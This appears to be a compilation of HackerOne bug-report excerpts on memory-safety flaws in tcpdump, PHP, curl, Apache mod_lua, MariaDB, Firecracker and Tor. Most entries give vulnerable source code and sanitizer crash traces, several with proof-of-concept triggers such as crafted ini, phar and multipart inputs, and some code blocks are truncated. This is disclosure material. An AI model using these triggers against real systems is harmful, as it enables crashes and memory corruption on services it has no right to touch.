12:05:07.276297 15738588889088us tsft 4096 MHz 11n 19dBm signal antenna 20 52.0 Mb/s MCS 25 20 MHz long GI LDPC FEC More Data 44us BSSID:20:7c:8f:50:3f:3a DA:68:a3:c4:03:46:da SA:20:7c:8f:50:3f:3a ReAssoc Request[|802.11]
=================================================================
==5793==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf4a01801 at pc 0x08090ae9 bp 0xffc10aa8 sp 0xffc10a98
READ of size 1 at 0xf4a01801 thread T0
    #0 0x8090ae8 in ctrl_body_print print-802_11.c:1676
    #1 0x8090ae8 in ieee802_11_print print-802_11.c:2092
    #2 0x809297b in ieee802_11_radio_print print-802_11.c:3257
    #3 0x809297b in ieee802_11_radio_if_print print-802_11.c:3352
    #4 0x80844b4 in pretty_print_packet print.c:332
    #5 0x8065ce8 in print_packet tcpdump.c:2497
    #6 0x83fcb6a in pcap_offline_read savefile.c:527
    #7 0x8346bfe in pcap_loop pcap.c:890
    #8 0x805afb8 in main tcpdump.c:2000
    #9 0xf700a636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)
    #10 0x806226a  (/home/user/targets/builds33/tcpdump-4.9.2/tcpdump+0x806226a)

0xf4a01801 is located 1 bytes to the right of 64-byte region [0xf4a017c0,0xf4a01800)
allocated by thread T0 here:
    #0 0xf723edee in malloc (/usr/lib32/libasan.so.2+0x96dee)
    #1 0x8400752 in pcap_check_header sf-pcap.c:401

SUMMARY: AddressSanitizer: heap-buffer-overflow print-802_
```

## #724253 Tcpdump before 4.9.3 has a buffer over-read in print-dccp.c:dccp_print_option() (CVE-2018-16229) — ibb — $500 — Out-of-bounds Read
Source: `hackerone/reports/2020/724253.md` (https://hackerone.com/reports/724253)

```
CVE-2018-16229,tcpdump,dccp_options-oobr.pcap,"Ryan Ackroyd",2018/05/26,Y,211124b972e74f0da66bc8b16f181f78793e2f66,4.9.3,,
```

```
tcpdump -e -vvvv -H -u -nn -r fuzzer06:id:000018,sig:11,src:007353,op:havoc,rep:16
```

```
reading from file fuzzer06:id:000018,sig:11,src:007353,op:havoc,rep:16, link-type EN10MB (Ethernet)
17:59:25.816632 00:07:e9:bd:5d:1f > 00:14:22:59:55:51, ethertype IPv4 (0x0800), length 66: (tos 0x0, ttl 64, id 65312, offset 0, flags [DF], proto DCCP (33), length 52)
    139.133.209.176.39420 > 139.133.209.65.5001: DCCP (CCVal 0, CsCov 0, cksum 0xaaf3 (incorrect -> 0x8bf3)) DCCP-Request (service=-189888898) seq 8 <nop, nop, nop, nop, change_l ack_ratio 2, change_r ccid 2, change_l ccid 2>
15:27:00.817006 00:14:22:59:55:51 > 00:07:e9:bd:5d:1f, ethertype IPv4 (0x0800), length 82: (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto DCCP (33), length 68)
    139.133.209.65.5001 > 139.133.209.176.39420: DCCP (CCVal 0, CsCov 0, ) DCCP-Response (service=0) (ack=38464816766) seq 1960341146 <nop, nop, change_l ack_ratio 2, [|dccp]>
15:27:00.817125 00:07:e9:bd:00:1f > 00:14:22:59:55:51, ethertype IPv4 (0x0800), length 32582: (tos 0x0, ttl 64, id 65313, offset 0, flags [DF], proto DCCP (33), length 56)
=================================================================
==5790==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf4a01bf4 at pc 0x080fd4b6 bp 0xfff8c088 sp 0xfff8c078
READ of size 4 at 0xf4a01bf4 thread T0
    #0 0x80fd4b5 in EXTRACT_32BITS extract.h:190
    #1 0x80fd4b5 in dccp_print_option print-dccp.c:633
    #2 0x80fd4b5 in dccp_print print-dccp.c:496
    #3 0x816e21a in ip_print_demux print-ip.c:391
    #4 0x816e21a in ip_print print-ip.c:673
    #5 0x8124f70 in 
```

## #248601 PHP INI Parsing Stack Buffer Overflow Vulnerability — ibb — $500 — Classic Buffer Overflow
Source: `hackerone/reports/2019/248601.md` (https://hackerone.com/reports/248601)

```
110 #if SIZEOF_ZEND_LONG == 4
111 # define MAX_LENGTH_OF_LONG 11
112 # define LONG_MIN_DIGITS "2147483648"
113 #elif SIZEOF_ZEND_LONG == 8
114 # define MAX_LENGTH_OF_LONG 20
115 # define LONG_MIN_DIGITS "9223372036854775808"
116 #else
117 # error "Unknown SIZEOF_ZEND_LONG"
118 #endif
```

```
 123 /* {{{ zend_ini_do_op()
 124 */
 125 static void zend_ini_do_op(char type, zval *result, zval *op1, zval *op2)
 126 {
 127         int i_result;
 128         int i_op1, i_op2;
 129         int str_len;
 130         char str_result[MAX_LENGTH_OF_LONG];
 131 
 132         i_op1 = atoi(Z_STRVAL_P(op1));
 133         zend_string_free(Z_STR_P(op1));
 134         if (op2) {
 135                 i_op2 = atoi(Z_STRVAL_P(op2));
 136                 zend_string_free(Z_STR_P(op2));
 137         } else {
 138                 i_op2 = 0;
 139         }
 140 
 141         switch (type) {
 142                 case '|':
 143                         i_result = i_op1 | i_op2;
 144                         break;
 145                 case '&':
 146                         i_result = i_op1 & i_op2;
 147                         break;
 148                 case '^':
 149                         i_result = i_op1 ^ i_op2;
 150                         break;
 151                 case '~':
 152                         i_result = ~i_op1;
 153                         break;
 154                 case '!':
 155                         i_result = !i_op1;
 156                         break;
 157                 default:
 158                         i_result = 0;
 159                         break;
 160         }
 161 
 162         str_len = zend_sprintf(str_result, "%d", i_result);
 163         ZVAL_NEW_STR(result, zend_string_init(str_result, str_len, ZEND_SYSTEM_INI));
 164 }
 165 /* }}} */
```

```
$ cat input.ini
0=0&~2000000000

$ cat input.php
<?php 

$argc = $_SERVER['argc'];
$argv = $_SERVER['argv'];

$file_loc = dirname(__FILE__)."/".$argv[1];

var_dump(parse_ini_file($file_loc, true, INI_SCANNER_NORMAL));

?>
```

## #248609 PHP OpenSSL zif_openssl_seal() heap overflow (wild memcpy) — ibb — $500 — Heap Overflow
Source: `hackerone/reports/2019/248609.md` (https://hackerone.com/reports/248609)

```
<?php 
$argc = $_SERVER['argc'];
$argv = $_SERVER['argv'];

$dir_str = dirname(__FILE__);
$file_str = ($dir_str)."/".$argv[1];
echo "Input file: ".$file_str."\n";

if(!extension_loaded('openssl')) print "openssl not loaded.\n";

$inputstr = file_get_contents($file_str);
print strlen($inputstr) . " bytes read.\n";

$pub_key_id = openssl_get_publickey($inputstr);
var_dump($pub_key_id);

openssl_seal($inputstr, $sealed, $ekeys, array($pub_key_id, $pub_key_id), 'AES-128-ECB');

var_dump($sealed);	
?>
$ uname -a
Linux CSLB16U 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

$ ./i686-pc-linux-gnu-php --version
PHP 7.1.5 (cli) (built: May 25 2017 16:35:37) ( NTS )
Copyright (c) 1997-2017 The PHP Group
Zend Engine v3.1.0, Copyright (c) 1998-2017 Zend Technologies

$ xxd -g 1 repro.pem 
00000000: 2d 2d 2d 2d 2d 42 45 47 49 4e 20 43 45 52 54 49  -----BEGIN CERTI
00000010: 46 49 43 41 54 45 2d 2d 2d 2d 2d 0a 4d 49 49 45  FICATE-----.MIIE
00000020: 6f 44 43 43 42 41 6d 67 41 77 49 42 41 67 49 42  oDCCBAmgAwIBAgIB
00000030: 4a 7a 41 4e 42 67 6b 71 68 6b 69 47 39 77 30 42  JzANBgkqhkiG9w0B
00000040: 41 51 51 46 41 44 43 42 6b 44 45 4c 4d 41 6b 47  AQQFADCBkDELMAkG
00000050: 41 31 55 45 46 68 4d 43 55 6b 38 78 0a 45 44 41  A1UEFhMCUk8x.EDA
00000060: 4f 42 67 4e 56 42 41 67 54 42 31 4a 76 62 57 46  OBgNVBAgTB1JvbWF
00000070: 75 61 57 45 78 45 44 41 4f 42 67 4e 56 42 41 63  uaWExEDAOBgNVBAc
00000080: 54 42 30 4e 79 59 57 6c 76 64 6d 45 78 44 7a 41  
```

```
41    for (i = 0; i < npubk; i++) {
42        ekl[i] =
43            EVP_PKEY_encrypt_old(ek[i], key, EVP_CIPHER_CTX_key_length(ctx),
44                                 pubk[i]);
45        if (ekl[i] <= 0)
46            return (-1);
47    }
48    return (npubk);
```

```
5930		for (i=0; i<nkeys; i++) {
5931			eks[i][eksl[i]] = '\0';
5932			add_next_index_stringl(ekeys, (const char*)eks[i], eksl[i]);
5933			efree(eks[i]);
5934			eks[i] = NULL;
5935		}
```

## #141202 imagescale out-of-bounds read — ibb — $500 — Memory Corruption - Generic
Source: `hackerone/reports/2019/141202.md` (https://hackerone.com/reports/141202)

```
Reading symbols from /home/user/php-7.0/sapi/cli/php...done.
(gdb) b gd_interpolation.c:890
Breakpoint 1 at 0x81925a9: file /home/user/php-7.0/ext/gd/libgd/gd_interpolation.c, line 890.
(gdb) b gd_interpolation.c:982 if i == 12
Breakpoint 2 at 0x81929fc: file /home/user/php-7.0/ext/gd/libgd/gd_interpolation.c, line 982.
(gdb) r
Starting program: /home/user/php-7.0/sapi/cli/php -n phuzz4.php

Breakpoint 1, _gdContributionsAlloc (line_length=13, windows_size=9) at /home/user/php-7.0/ext/gd/libgd/gd_interpolation.c:890
890         res->ContribRow = (ContributionType *) gdMalloc(line_length * sizeof(ContributionType));

# windows_size is 9 

(gdb) c
Continuing.

Breakpoint 2, _gdScaleRow (pSrc=0x8c71c38, src_width=100, dst=0x8c7f5f0, dst_width=13, row=0, contrib=0x8c5c2d8)
    at /home/user/php-7.0/ext/gd/libgd/gd_interpolation.c:982
982                 r += (unsigned char)(contrib->ContribRow[x].Weights[left_channel] * (double)(gdTrueColorGetRed(p_src_row[i])));
(gdb) p left_channel
$1 = 9

contrib->ContribRow[x].Weights[left_channel] tries to access 10th element but the size is 9.
```

```
    at /home/user/php-7.0/ext/gd/libgd/gd_interpolation.c:982
```

## #143234 Integer Overflow in _gd2GetHeader() resulting in heap overflow — ibb — $500 — Memory Corruption - Generic
Source: `hackerone/reports/2019/143234.md` (https://hackerone.com/reports/143234)

```
    sy=0x7fffffffa524, cs=0x7fffffffa530, vers=0x7fffffffa534, 
    fmt=0x7fffffffa538, ncx=0x7fffffffa528, ncy=0x7fffffffa52c, 
    chunkIdx=0x7fffffffa540) at /php/php-5.6.22/ext/gd/libgd/gd_gd2.c:139
```

```
    ctx=ctx@entry=0x7ffff7fd0ac0) at /php/php-5.6.22/ext/gd/libgd/gd_io.c:103
```

## #477344 Heap Buffer Overflow (READ: 4) in phar_parse_pharfile — ibb — - — Buffer Over-read
Source: `hackerone/reports/2020/477344.md` (https://hackerone.com/reports/477344)

```
USE_ZEND_ALLOC=0 php -d phar.readonly=0 -r "var_dump(new Phar('php-oob4.phar',0,'project.phar'));"
```

```
X19IQUxUX0NPTVBJTEVSKCk7CgAAANQpRbJAlS4oDzkKFD1B2bK4fX3DAgAAAEdCTUI=
```

```
=================================================================
==2741==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000ab7a at pc 0x0000013258a7 bp 0x7ffd845ab330 sp 0x7ffd845ab328
READ of size 4 at 0x60200000ab7a thread T0
    #0 0x13258a6 in phar_parse_pharfile /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:973:2
    #1 0x13258a6 in phar_open_from_fp /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1708
    #2 0x131a6c1 in phar_create_or_parse_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1343:7
    #3 0x1318503 in phar_open_or_create_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1316:9
    #4 0x1341705 in zim_Phar___construct /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar_object.c:1195:6
    #5 0x1dc6cbb in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:907:4
    #6 0x1c15505 in execute_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:59739:7
    #7 0x1c15f56 in zend_execute /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:63776:2
    #8 0x1a07225 in zend_eval_stringl /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1083:4
    #9 0x1a07d6a in zend_eval_stringl_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1124:11
    #10 0x1a07d6a in zend_eval_string_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1135
    #
```

## #2187833 CVE-2023-38545: socks5 heap buffer overflow — curl — - — Heap Overflow
Source: `hackerone/reports/2023/2187833.md` (https://hackerone.com/reports/2187833)

```
    (conn->socks_proxy.proxytype == CURLPROXY_SOCKS5) ? TRUE : FALSE;
```

```
    /* RFC1928 chapter 5 specifies max 255 chars for domain name in packet */
    if(!socks5_resolve_local && hostname_len > 255) {
      infof(data, "SOCKS5: server resolving disabled for hostnames of "
            "length > 255 [actual len=%zu]", hostname_len);
      socks5_resolve_local = TRUE;
    }
```

```
    sx->outstanding = 2; /* expect two bytes */
    sx->outp = socksreq; /* store it here */
    /* FALLTHROUGH */
```

## #2823554 Buffer overflow in strcpy — curl — - — Buffer Underflow
Source: `hackerone/reports/2024/2823554.md` (https://hackerone.com/reports/2823554)

```
#0  __strcpy_evex () at ../sysdeps/x86_64/multiarch/strcpy-evex.S:94
#1  0x00007ffff765d2cd in CRYPTO_strdup () from /lib/x86_64-linux-gnu/libcrypto.so.3
#2  0x00007ffff756ef96 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#3  0x00007ffff7570103 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#4  0x00007ffff7571ef9 in CONF_modules_load_file_ex () from /lib/x86_64-linux-gnu/libcrypto.so.3
#5  0x00007ffff75722c8 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#6  0x00007ffff765a98f in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3
#7  0x00007ffff7d51087 in __pthread_once_slow (once_control=0x7ffff7981498, init_routine=0x7ffff765a980)
    at ./nptl/pthread_once.c:116
```

```
rax            0x472cf0            4664560
rbx            0x7ffff7832be3      140737345956835
rcx            0x472cf0            4664560
rdx            0x472cf0            4664560
rsi            0x7ffff7832be3      140737345956835
rdi            0x472cf0            4664560
rbp            0x7ffff7832b3d      0x7ffff7832b3d
rsp            0x7fffffffd988      0x7fffffffd988
rip            0x7ffff7e31b80      0x7ffff7e31b80 <__strcpy_evex>
```

```
0x7fffffffd988: 0xf765d2cd      0x00007fff      0x00464a60      0x00000000
0x7fffffffd998: 0x00472aa0      0x00000000      0x00000000      0x00000000
0x7fffffffd9a8: 0xf756ef96      0x00007fff      0x00000019      0x00000000
0x7fffffffd9b8: 0x79a81a00      0x206eedee      0xf7832b3d      0x00007fff
0x7fffffffd9c8: 0x00472a70      0x00000000      0x00472aa0      0x00000000
0x7fffffffd9d8: 0x00472cc0      0x00000000      0x00000000      0x00000000
0x7fffffffd9e8: 0xf766ea3d      0x00007fff      0x00000000      0x00000000
0x7fffffffd9f8: 0x00000000      0x00000000      0xf7959ec0      0x00007fff
0x7fffffffda08: 0xf766e9dd      0x00007fff      0x00000019      0x00000000
0x7fffffffda18: 0xf765a09f      0x00007fff      0x00464a60      0x00000000
```

## #3788482 Stack Buffer Overflow in mariadb-dump quote_name() Allows Malicious Server to Execute Arbitrary Code on Client — mariadb — - — Stack Overflow
Source: `hackerone/reports/2026/3788482.md` (https://hackerone.com/reports/3788482)

```
// client/mysqldump.cc:2227-2243
static char *quote_name(const char *name, char *buff, my_bool force)
{
  char *to= buff;
  char qtype= (opt_compatible_mode & MASK_ANSI_QUOTES) ? '\"' : '`';
  if (!force && !opt_quoted && !test_if_special_chars(name))
    return (char*) name;
  *to++= qtype;
  while (*name)
  {
    if (*name == qtype)
      *to++= qtype;       // doubles every backtick: 1 byte in -> 2 bytes out
    *to++= *name++;
  }
  to[0]= qtype;
  to[1]= 0;
  return buff;
}
```

```
// client/mysqldump.cc:2269-2288
static char *quote_for_like(const char *name, char *buff)
{
  char *to= buff;
  *to++= '\'';
  while (*name)
  {
    if (*name == '\\')
    {
      *to++='\\';
      *to++='\\';
      *to++='\\';    // 4x expansion: 1 byte in -> 4 bytes out
    }
    *to++= *name++;
  }
```

```
// client/mysqldump.cc:5835-5862
char hash_key[2*NAME_LEN+2];
afterdot= strmov(hash_key, database);
*afterdot++= '.';
// ...
char *end= strmov(afterdot, table);  // unbounded copy of server-returned name
```

## #384477 Int Overflow lead to Heap OverFlow in exif_thumbnail_extract of exif.c — ibb — - — Integer Overflow
Source: `hackerone/reports/2019/384477.md` (https://hackerone.com/reports/384477)

```
if ((ImageInfo->Thumbnail.offset + ImageInfo->Thumbnail.size) > length) {
	EXIF_ERRLOG_THUMBEOF(ImageInfo)
	return;
}
ImageInfo->Thumbnail.data = estrndup(offset + ImageInfo->Thumbnail.offset, ImageInfo->Thumbnail.size);
```

```
When running the test script with an ASAN enabled PHP interpreter with USE_ZEND_ALLOC=0, the following ASAN report/backtrace is generated:
=================================================================
==29132==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb2500000 at pc 0x0814a6cd bp 0xbfd1f388 sp 0xbfd1ef60
READ of size 65535 at 0xb2500000 thread T0
    #0 0x814a6cc in __asan_memcpy /home/youghurt/llvm-src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:23
    #1 0x95f1eaa in _estrndup /home/youghurt/php-7.2.6/Zend/zend_alloc.c:2538:2
    #2 0x899a435 in exif_thumbnail_extract /home/youghurt/php-7.2.6/ext/exif/exif.c:2951:30
    #3 0x899665e in exif_process_IFD_in_JPEG /home/youghurt/php-7.2.6/ext/exif/exif.c:3619:5
    #4 0x8995c06 in exif_process_TIFF_in_JPEG /home/youghurt/php-7.2.6/ext/exif/exif.c:3665:2
    #5 0x8995586 in exif_process_APP1 /home/youghurt/php-7.2.6/ext/exif/exif.c:3690:2
    #6 0x89918f4 in exif_scan_JPEG_header /home/youghurt/php-7.2.6/ext/exif/exif.c:3835:6
    #7 0x8990433 in exif_scan_FILE_header /home/youghurt/php-7.2.6/ext/exif/exif.c:4224:8
    #8 0x898ff1f in exif_read_from_impl /home/youghurt/php-7.2.6/ext/exif/exif.c:4365:8
    #9 0x8989e8a in exif_read_from_stream /home/youghurt/php-7.2.6/ext/exif/exif.c:4382:8
    #10 0x898a3cf in exif_read_from_file /home/youghurt/php-7.2.6/ext/exif/exif.c:4409:8
    #11 0x89829b7 in zif_exif_read_data /home/youghurt/php-7.2.6/ext/exif/exif.c:4482:9
    #12 0x9cb0053 in ZEN
```

```
    #0 0x814a6cc in __asan_memcpy /home/youghurt/llvm-src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:23
    #1 0x95f1eaa in _estrndup /home/youghurt/php-7.2.6/Zend/zend_alloc.c:2538:2
    #2 0x899a435 in exif_thumbnail_extract /home/youghurt/php-7.2.6/ext/exif/exif.c:2951:30
    #3 0x899665e in exif_process_IFD_in_JPEG /home/youghurt/php-7.2.6/ext/exif/exif.c:3619:5
    #4 0x8995c06 in exif_process_TIFF_in_JPEG /home/youghurt/php-7.2.6/ext/exif/exif.c:3665:2
    #5 0x8995586 in exif_process_APP1 /home/youghurt/php-7.2.6/ext/exif/exif.c:3690:2
    #6 0x89918f4 in exif_scan_JPEG_header /home/youghurt/php-7.2.6/ext/exif/exif.c:3835:6
    #7 0x8990433 in exif_scan_FILE_header /home/youghurt/php-7.2.6/ext/exif/exif.c:4224:8
    #8 0x898ff1f in exif_read_from_impl /home/youghurt/php-7.2.6/ext/exif/exif.c:4365:8
    #9 0x8989e8a in exif_read_from_stream /home/youghurt/php-7.2.6/ext/exif/exif.c:4382:8
    #10 0x898a3cf in exif_read_from_file /home/youghurt/php-7.2.6/ext/exif/exif.c:4409:8
    #11 0x89829b7 in zif_exif_read_data /home/youghurt/php-7.2.6/ext/exif/exif.c:4482:9
    #12 0x9cb0053 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/youghurt/php-7.2.6/Zend/zend_vm_execute.h:617:2
    #13 0x999e521 in execute_ex /home/youghurt/php-7.2.6/Zend/zend_vm_execute.h:59723:7
    #14 0x999fb57 in zend_execute /home/youghurt/php-7.2.6/Zend/zend_vm_execute.h:63760:2
    #15 0x972f63e in zend_execute_scripts /home/youghurt/php-7.2.6/Zend/zend.c:1496:4
    #16 0x9438e0
```

## #2887487 Buffer Overflow Risk in Curl_inet_ntop and inet_ntop4 — curl — - — Classic Buffer Overflow
Source: `hackerone/reports/2024/2887487.md` (https://hackerone.com/reports/2887487)

```
#include <stdio.h>
#include <string.h>
#include <errno.h>

static char *inet_ntop4(const unsigned char *src, char *dst, size_t size) {
    char tmp[sizeof("255.255.255.255")];
    snprintf(tmp, sizeof(tmp), "%d.%d.%d.%d",
             src[0], src[1], src[2], src[3]);

    if (strlen(tmp) >= size) {
        errno = ENOSPC;
        return NULL;
    }
    strcpy(dst, tmp); // Vulnerable to overflow
    return dst;
}

int main() {
    unsigned char ipv4[4] = {192, 168, 0, 1};
    char small_buffer[10]; // Intentionally too small

    // Test with an insufficient buffer
    if (inet_ntop4(ipv4, small_buffer, sizeof(small_buffer)) == NULL) {
        perror("inet_ntop4 failed");
    } else {
        printf("IPv4: %s\n", small_buffer);
    }

    return 0;
}
```

```
gcc -fsanitize=address -o inet_ntop4_test inet_ntop4.c
./inet_ntop4_test
```

```
#include <stdio.h>
#include <string.h>
#include <errno.h>

extern char *inet_ntop4(const unsigned char *src, char *dst, size_t size);

char *Curl_inet_ntop(int af, const void *src, char *buf, size_t size) {
    switch(af) {
    case AF_INET:
        return inet_ntop4((const unsigned char *)src, buf, size);
    default:
        errno = EAFNOSUPPORT;
        return NULL;
    }
}

int main() {
    unsigned char ipv4[4] = {192, 168, 0, 1};
    char small_buffer[10]; // Intentionally too small

    // Test with IPv4
    if (Curl_inet_ntop(AF_INET, ipv4, small_buffer, sizeof(small_buffer)) == NULL) {
        perror("Curl_inet_ntop failed");
    } else {
        printf("IPv4: %s\n", small_buffer);
    }

    return 0;
}
```

## #2298307 Buffer Overflow Vulnerability in WebSocket Handling — curl — - — Heap Overflow
Source: `hackerone/reports/2024/2298307.md` (https://hackerone.com/reports/2298307)

```
strncpy(keyval, randstr, sizeof(keyval) - 1);
keyval[sizeof(keyval) - 1] = '\0';  // Null-terminate the string
```

## #1434056 Buffer overflow in req_parsebody method in lua_request.c — ibb — - — Heap Overflow
Source: `hackerone/reports/2022/1434056.md` (https://hackerone.com/reports/1434056)

```
  ...
  size_t  vlen = 0;
  ...
  ...
  vlen = end - crlf - 8;
  buffer = (char *) apr_pcalloc(r->pool, vlen+1);
  memcpy(buffer, crlf + 4, vlen);
  ...
```

```
   LoadModule lua_module modules/mod_lua.so
   <Files "*.lua">
    SetHandler lua-script
   </Files>
 
```

```
    `curl -v -X POST -H 'content-type: multipart/form-data; boundary=-' --data-binary $'-\r\n\r\naaa-' http://127.0.0.1/test.lua`
    Apache web server will crash.
```

## #3294999 CVE-2025-9086: Out of bounds read for cookie path — curl — - — Buffer Over-read
Source: `hackerone/reports/2025/3294999.md` (https://hackerone.com/reports/3294999)

```
static int
replace_existing(struct Curl_easy *data,
                 struct Cookie *co,
                 struct CookieInfo *ci,
                 bool secure,
                 bool *replacep)
{
  bool replace_old = FALSE;
  struct Curl_llist_node *replace_n = NULL;
  struct Curl_llist_node *n;
  size_t myhash = cookiehash(co->domain);
  for(n = Curl_llist_head(&ci->cookielist[myhash]); n; n = Curl_node_next(n)) {
    struct Cookie *clist = Curl_node_elem(n);
    if(!strcmp(clist->name, co->name)) {
      /* the names are identical */
      bool matching_domains = FALSE;

      if(clist->domain && co->domain) {
        if(curl_strequal(clist->domain, co->domain))
          /* The domains are identical */
          matching_domains = TRUE;
      }
      else if(!clist->domain && !co->domain)
        matching_domains = TRUE;

      if(matching_domains && /* the domains were identical */
         clist->spath && co->spath && /* both have paths */
         clist->secure && !co->secure && !secure) {
        size_t cllen;
        const char *sep;

        /*
         * A non-secure cookie may not overlay an existing secure cookie.
         * For an existing cookie "a" with path "/login", refuse a new
         * cookie "a" with for example path "/login/en", while the path
         * "/loginhelper" is ok.
         */

        sep = strchr(clist->spath + 1, '/'); // ***0***

        if(sep)
          cllen = sep - clist->spath;
        else
          cllen = strlen(clist->spath);

     
```

```
static int
parse_cookie_header(struct Curl_easy *data,
                    struct Cookie *co,
                    struct CookieInfo *ci,
                    const char *ptr,
                    const char *domain, /* default domain */
                    const char *path,   /* full path used when this cookie is
                                           set, used to get default path for
                                           the cookie unless set */
                    bool secure)  /* TRUE if connection is over secure
                                     origin */
{

// ...

      else if(curlx_str_casecompare(&name, "path")) {
        strstore(&co->path, curlx_str(&val), curlx_strlen(&val));
        if(!co->path)
          return CERR_OUT_OF_MEMORY;
        free(co->spath); /* if this is set again */
        co->spath = sanitize_cookie_path(co->path); // ***1***
        if(!co->spath)
          return CERR_OUT_OF_MEMORY;
      }

// ...
```

```
/*
 * cookie path sanitize
 */
static char *sanitize_cookie_path(const char *cookie_path)
{
  size_t len = strlen(cookie_path);

  /* some sites send path attribute within '"'. */
  if(cookie_path[0] == '\"') {
    cookie_path++;
    len--;
  }
  if(len && (cookie_path[len - 1] == '\"'))
    len--;

  /* RFC6265 5.2.4 The Path Attribute */
  if(cookie_path[0] != '/')
    /* Let cookie-path be the default-path. */
    return strdup("/");

  /* remove trailing slash */
  /* convert /hoge/ to /hoge */
  if(len && cookie_path[len - 1] == '/') // ***2***
    len--;

  return Curl_memdup0(cookie_path, len);
}
```

## #3575245 Integer Overflow in curl_multi_get_handles() Leading to Heap Buffer Overflow — curl — - — Classic Buffer Overflow
Source: `hackerone/reports/2026/3575245.md` (https://hackerone.com/reports/3575245)

```
// lib/multi.c:3728-3729
unsigned int count = Curl_uint32_tbl_count(&multi->xfers);
CURL **a = curlx_malloc(sizeof(struct Curl_easy *) * (count + 1));  // OVERFLOW when count == UINT_MAX
// When count == 0xFFFFFFFF: count + 1 = 0, malloc(0) returns non-NULL
// Subsequent a[i++] = data writes to undersized buffer
```

```
curl 8.18.0 (x86_64-pc-linux-gnu) libcurl/8.18.0 OpenSSL/3.0.0 zlib/1.2.13
Release-Date: 2026-01-07
Protocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL TLS-SRP UnixSockets zstd
```

```
CURL **curl_multi_get_handles(CURLM *m)
{
  struct Curl_multi *multi = m;
  void *entry;
  unsigned int count = Curl_uint32_tbl_count(&multi->xfers);
  CURL **a = curlx_malloc(sizeof(struct Curl_easy *) * (count + 1));  // VULNERABLE
  if(a) {
    unsigned int i = 0;
    uint32_t mid;
    if(Curl_uint32_tbl_first(&multi->xfers, &mid, &entry)) {
      do {
        struct Curl_easy *data = entry;
        DEBUGASSERT(i < count);
        if(!data->state.internal)
          a[i++] = data;  // Write to potentially undersized buffer
      } while(Curl_uint32_tbl_next(&multi->xfers, mid, &mid, &entry));
    }
    a[i] = NULL;
  }
  return a;
}
```

## #3738654  Firecracker Out-of-bounds Read/Write Local Privilege Escalation Vulnerability — aws_vdp — - — Out-of-bounds Read
Source: `hackerone/reports/2026/3738654.md` (https://hackerone.com/reports/3738654)

```
0x18 => self.with_queue_mut(queues, |q| q.size = value),
...
0x1c => self.with_queue_mut(queues, |q| {
    if value != 0 {
        q.ready = value == 1;
    }
}),
...
0x20 => self.with_queue_mut(locked_device.queues_mut(), |q| {
    lo(&mut q.desc_table_address, value)
}),
0x24 => self.with_queue_mut(locked_device.queues_mut(), |q| {
    hi(&mut q.desc_table_address, value)
}),
0x28 => self.with_queue_mut(locked_device.queues_mut(), |q| {
    lo(&mut q.avail_ring_address, value)
}),
0x2c => self.with_queue_mut(locked_device.queues_mut(), |q| {
    hi(&mut q.avail_ring_address, value)
}),
0x30 => self.with_queue_mut(locked_device.queues_mut(), |q| {
    lo(&mut q.used_ring_address, value)
}),
0x34 => self.with_queue_mut(locked_device.queues_mut(), |q| {
    hi(&mut q.used_ring_address, value)
}),
```

```
pub fn initialize<M: GuestMemory>(&mut self, mem: &M) -> Result<(), QueueError> {
    ...
    self.desc_table_ptr =
        self.get_aligned_slice_ptr(mem, self.desc_table_address, self.desc_table_size(), 16)?;
    self.avail_ring_ptr =
        self.get_aligned_slice_ptr(mem, self.avail_ring_address, self.avail_ring_size(), 2)?;
    self.used_ring_ptr =
        self.get_aligned_slice_ptr(mem, self.used_ring_address, self.used_ring_size(), 4)?;
    Ok(())
}
```

```
fn update_queue_field<F: FnOnce(&mut Queue)>(&mut self, queues: &mut [Queue], f: F) {
    let status = self.driver_status;
    if status == (ACKNOWLEDGE | DRIVER | FEATURES_OK) {
        self.with_queue_mut(queues, f);
    } else {
        warn!(
            "pci: queue config write not allowed in device status {:#x}",
            status
        );
    }
}
...
QUEUE_SIZE => self.update_queue_field(queues, |q| q.size = value),
...
QUEUE_ENABLE => self.update_queue_field(queues, |q| {
    if value != 0 {
        q.ready = value == 1;
    }
}),
...
QUEUE_DESC_LO => self.update_queue_field(locked_device.queues_mut(), |q| {
    lo(&mut q.desc_table_address, value)
}),
...
QUEUE_USED_HI => self.update_queue_field(locked_device.queues_mut(), |q| {
    hi(&mut q.used_ring_address, value)
}),
```

## #3709605 Conflux-queued zero-length RELAY_END triggers heap out-of-bounds read — torproject — - — Out-of-bounds Read
Source: `hackerone/reports/2026/3709605.md` (https://hackerone.com/reports/3709605)

```
int reason = get_uint8(msg->body);
```

